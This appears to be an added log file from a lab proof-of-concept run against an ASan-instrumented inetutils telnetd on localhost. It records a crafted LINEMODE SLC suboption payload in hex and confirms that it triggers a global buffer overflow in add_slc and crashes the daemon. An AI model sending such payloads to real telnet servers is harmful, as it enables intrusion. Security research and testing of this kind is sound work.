@@ -1,0 +1,13 @@
+telnetd=/home/mesh-home/mishe-tauftauf2shell/lab/frontier/inetutils2shell/build/asan-2.7/telnetd/telnetd
+listen=127.0.0.1:46379 (ephemeral, plant-started)
+argv=/home/mesh-home/mishe-tauftauf2shell/lab/frontier/inetutils2shell/build/asan-2.7/telnetd/telnetd --debug=options=3 -h -E /bin/sleep 300
+triplets=50 triplet=42415a payload_len=156
+exploit_sent=True accepted=True subopts_total=1
+greeting=fffd18fffd20fffd23fffd27fffd24fffb03fffd01fffd22fffd1ffffb05fffd21fffa220103fff000
+our_bytes_len=189
+our_bytes_first=fffc18fffc20fffc23fffc27fffc24fffe03fffc01fffb22fffa220342415a42415a42415a42415a42415a42415a42415a42415a42415a42415a42415a42415a42415a42415a42415a42415a42415a42415a42415a42415a42415a42415a42415a42415a42415a42415a42415a42415a42415a42415a42415a42415a42415a42415a42415a42415a42415a42415a42415a42415a42415a42415a42415a42415a42415a42415a42415a42415a42415a42415afff0fffc1ffffe05fffc21
+daemon_exit=-6 alive_before_terminate=False
+asan_error=True
+asan_global_overflow=True
+asan_write1=True
+add_slc_frame=True
